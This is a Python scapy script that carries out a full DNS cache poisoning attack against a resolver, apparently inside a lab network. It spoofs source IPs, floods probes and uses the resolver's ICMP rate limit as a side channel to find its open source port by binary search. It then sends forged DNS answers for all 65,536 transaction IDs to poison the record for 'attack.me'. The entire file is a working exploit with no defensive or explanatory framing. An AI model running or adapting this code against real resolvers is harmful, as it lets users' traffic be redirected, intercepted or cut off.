from scapy.all import *

import random

ICMP_LIMIT_RATE = 50
ICMP_REPLY_WAIT_TIME = .025
START_PORT = 30000
VICTIM_DOMAIN_NAME = "attack.me"

VICTIM_RESOLVER_IP = "10.13.37.9"
VICTIM_RESOLVER_PORT = 53

NAMESERVER_IP = "10.13.37.5"

MY_IP = "10.13.37.6"
MY_SPORT = 9999

KNOWN_BAD_PORTS = [x for x in range(1, 5)]


global_socket = conf.L2socket(iface='eth0')


def prepare_dns_replies():
    # Reference: https://blog.woefe.com/posts/faster_scapy.html
    dns_replies = []
    for txid in range(0, 65536):
        dns_replies.append(
            Ether()
            / IP(dst=VICTIM_RESOLVER_IP, src=NAMESERVER_IP)
            / UDP(sport=53, dport=0)
            / DNS(id=txid, qr=1, qdcount=1, ancount=1, aa=1,
                    qd=DNSQR(qname=VICTIM_DOMAIN_NAME, qtype=0x0001, qclass=0x0001),
                    an=DNSRR(rrname=VICTIM_DOMAIN_NAME, ttl=70000, rdata="255.255.255.255"))
        )
    raw_dns_replies = []
    for dns_reply in dns_replies:
        raw_dns_replies.append(bytearray(raw(dns_reply)))
    header = struct.pack(
        "!4s4sHH",
        inet_pton(socket.AF_INET, dns_replies[0]["IP"].src),
        inet_pton(socket.AF_INET, dns_replies[0]["IP"].dst),
        socket.IPPROTO_UDP,
        len(raw_dns_replies[0][34:]),
    )
    return (raw_dns_replies, header)

def forge_DNS_response(raw_dns_replies, header, actual_port):
    '''Updates all pre-prepared responses with proper dport.'''
    # Reference: https://blog.woefe.com/posts/faster_scapy.html
    for reply in raw_dns_replies:
        # update actual port
        reply[36] = (actual_port >> 8) & 0xFF
        reply[37] = actual_port & 0xFF
        # update checksum
        reply[40] = 0x00
        reply[41] = 0x00

        calculate_check_sum = checksum(header + reply[34:])
        if calculate_check_sum == 0:
            calculate_check_sum = 0xFFFF
        check_sum = struct.pack("!H", calculate_check_sum)
        reply[40] = check_sum[0]
        reply[41] = check_sum[1]
        global_socket.send(reply)
    return True

def binary_search(arr):
    ports = list(arr)
    while len(ports)!=1:
        print("Binary Search Iteration ", ports)


        mid = len(ports) // 2
        left = ports[:mid]
        right = ports[mid:]

        left_copy = list(ports[:mid])
        while len(left_copy)!=50:
            left_copy.append(random.choice(KNOWN_BAD_PORTS))
    
        left_res = flood(left_copy)
        print("Tried flooding ", left_copy, " got result ", left_res)
        if left_res:
            print("Going left")
            ports = list(left)
        else:
            print("Going Right")
            ports = list(right)
        
        time.sleep(0.1)
        continue

    print("Narrowed down to port: ", ports)
    single_port = list(ports)
    while len(single_port)!=50:
        single_port.append(random.choice(KNOWN_BAD_PORTS))

    return ports[0] if flood(single_port) else None


def generate_random_ipv4():
    return "100.13." + str(random.randint(50, 230))+"." + str(random.randint(50, 230))

def send_initial_query():
    ip_layer = IP(dst=VICTIM_RESOLVER_IP, src=MY_IP)
    udp_layer = UDP(dport=VICTIM_RESOLVER_PORT, sport=MY_SPORT)
    dns_layer = DNS(rd=1, qd=DNSQR(qname=VICTIM_DOMAIN_NAME))
    packet = ip_layer / udp_layer / dns_layer
    send(packet)

def flood(ports):
    time.sleep(0.025)
    probe_packet = []
    for i in ports:
        ip_layer = IP(dst=VICTIM_RESOLVER_IP, src=generate_random_ipv4())
        udp_layer = UDP(dport=i, sport=RandShort())
        packet = Ether() / ip_layer / udp_layer
        probe_packet.append(raw(packet))

    for packet in probe_packet:
        global_socket.send(packet)

    # Verification Packet
    ip_layer = IP(dst=VICTIM_RESOLVER_IP)
    udp_layer = UDP(dport=1, sport=RandShort())
    verification_packet = Ether() / ip_layer / udp_layer

    reply = global_socket.sr1(verification_packet, timeout=ICMP_REPLY_WAIT_TIME, verbose=0)

    return True if reply else False

def main():
    print("Preparing all packets for spoofing...")
    raw_dns_replies, header = prepare_dns_replies()
    sport = None
    print("Done!")
    print("Sending initial query to be poisoned...")
    send_initial_query()
    print("Attempting to find recursive resolver source port...")
    for offset in range(200):
        scan = [x for x in range(START_PORT+(50*offset), START_PORT+ICMP_LIMIT_RATE+(50*offset))]
        res = flood(scan)
        if res:
            print(f"Open Port Identified in {START_PORT+(50*offset)} {START_PORT+ICMP_LIMIT_RATE+(50*offset)}")
            print("Starting Binary Search...")
            sport = binary_search(scan)
            break
    if not sport:
        print("Attack failed - binary searched attemped on no longer open port or open port unable to be found. Please re-run.")
        exit(1)
    print(f"Found sport: {sport}")
    forge_DNS_response(raw_dns_replies, header, sport)
    

main()